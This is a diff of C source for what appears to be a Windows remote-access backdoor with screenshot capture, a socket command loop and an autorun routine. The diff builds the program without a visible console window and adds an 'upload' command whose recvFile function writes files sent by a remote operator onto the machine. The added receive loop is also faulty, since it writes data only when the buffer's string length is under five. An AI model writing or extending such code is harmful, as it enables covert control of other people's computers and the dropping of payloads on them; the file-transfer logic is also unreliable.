@@ -4,11 +4,9 @@
 #include <windows.h>
 #include <winable.h>
 #pragma comment(lib, "ws2_32.lib")
-/*
 #ifdef _MSC_VER  
 #pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )  
 #endif
-*/
 
 
 #define MSG_LEN 1024
@@ -46,6 +44,37 @@ int sendFile(SOCKET client, char *filename)
 		system("del screen.png");
 	}
 	
+	return 0;
+}
+
+// 接受文件
+int recvFile(SOCKET client, char *filename) 
+{
+	int len;
+    char recvBuf[1024] = {0};   // 缓冲区
+    HANDLE hFile;               // 文件句柄
+    DWORD count;                // 写入的数据计数
+ 
+
+	printf("%s\n",filename);
+    hFile = CreateFile(filename, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_ARCHIVE, NULL);
+	if(hFile==INVALID_HANDLE_VALUE) {
+		return 1;
+	}
+    while (1) {
+        // 从客户端读数据
+		ZeroMemory(recvBuf, sizeof(recvBuf));   
+		len = recv(client, recvBuf, 1024, 0);
+		printf("%d\n",len);
+        if (strlen(recvBuf) < 5) {
+            if (strcmp(recvBuf, "EOF") == 0) {
+                CloseHandle(hFile);
+                break;
+            }
+            WriteFile(hFile,recvBuf,len,&count,0);
+		}
+    }
+
 	return 0;
 }
 
@@ -349,6 +378,14 @@ void c_socket()
 				send(client,"EOFNN",strlen("EOFNN")+1,0);
 			}
 			continue;
+		}else if(strcmp(recvCmd,"upload")==0){ //下载文件
+			ZeroMemory(recvCmd, sizeof(recvCmd));
+			recv(client, recvCmd, MSG_LEN, 0);
+			if(recvFile(client,recvCmd)){
+				printf("error");
+
+			}
+			continue;
 		}else{
 			continue;
 		}
@@ -356,7 +393,6 @@ void c_socket()
 	WSACleanup();
     return;
 }
-
 
 int autoRun()
 {
